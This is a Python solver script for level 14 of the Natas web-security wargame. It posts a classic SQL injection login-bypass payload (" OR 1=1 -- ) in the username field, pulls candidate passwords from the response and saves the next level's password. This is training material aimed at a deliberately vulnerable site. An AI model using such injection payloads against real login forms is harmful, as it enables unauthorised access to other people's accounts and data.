"""
natas14: SQL injection, no input sanitization
"""

import requests
from typing import Optional

from natas_utils import *

LEVEL = 14

def solve(url: str, login: LevelLogin) -> Optional[str]:
    payload = f'" OR 1=1 -- '
    form_data = {
        "username": payload,
        "password": "",
    }
    response = requests.post(url, auth=login, data=form_data)
    # print(response.text)

    return try_level_login(LEVEL + 1, extract_candidate_passwords(response.text))

if __name__ == "__main__":
    url, login = load_level(LEVEL)
    flag = solve(url, login)

    if flag:
        print("natas{:02}:".format(LEVEL + 1), flag)
        store_level_password(LEVEL + 1, flag)
    else:
        exit("Failed to get password for natas{:02}.".format(LEVEL + 1))